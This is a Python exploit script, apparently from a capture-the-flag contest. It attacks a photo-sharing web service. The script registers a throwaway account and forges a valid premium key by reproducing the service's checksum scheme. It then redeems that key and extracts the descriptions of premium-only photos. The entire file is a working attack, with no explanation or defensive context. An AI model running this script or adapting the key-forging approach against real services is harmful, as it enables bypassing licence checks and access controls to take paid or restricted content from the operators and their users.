import sys
import requests
import hashlib
from utils import generate_upper_hex, generate_string, generate_email
from utils.auth import register_user, get_user_token

# Random  premium key based on pattern on shared/key_validator.py
def generate_key() -> str:
    pre_key = f'PREM-{generate_upper_hex(4)}-{generate_upper_hex(4)}-{generate_upper_hex(4)}-'
    product_key = ''.join(pre_key.split('-')[1:4])
    product_checksum = hashlib.sha256(product_key.encode()).hexdigest().upper()[:4]

    key = pre_key + product_checksum

    return key

def buy_premium(url: str, user_token: str, key: str) -> bool:
    headers = {
        'Authorization': f'Bearer {user_token}'
    }

    resp = requests.post(f'{url}/premium/buy', headers=headers, json={'key': key})
    if 'Поздравляем' in resp.text:
        return True
    
    return False

# Gather premium photos descriptions with user credentials
def get_premium_photos_descriptions(url: str, user_token: dict) -> list[str]:
    headers = {
        'Authorization': f'Bearer {user_token}'
    }
    resp = requests.get(f'{url}/photo/all_files', headers=headers)

    premium_descriptions: list = []
    for photo in resp.json():
        if photo.get('premium_only', False):
            premium_descriptions.append(photo.get('description', ''))
    
    return premium_descriptions


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: broken_access_control.py <url>')
    url = sys.argv[1]
    user = {
        'email': generate_email(),
        'password': generate_string(8)
    }
    register_user(url, user)
    user_token = get_user_token(url, user)
    key = generate_key()
    buy_premium(url, user_token, key)
    premium_user_token = get_user_token(url, user)
    print(get_premium_photos_descriptions(url, premium_user_token))
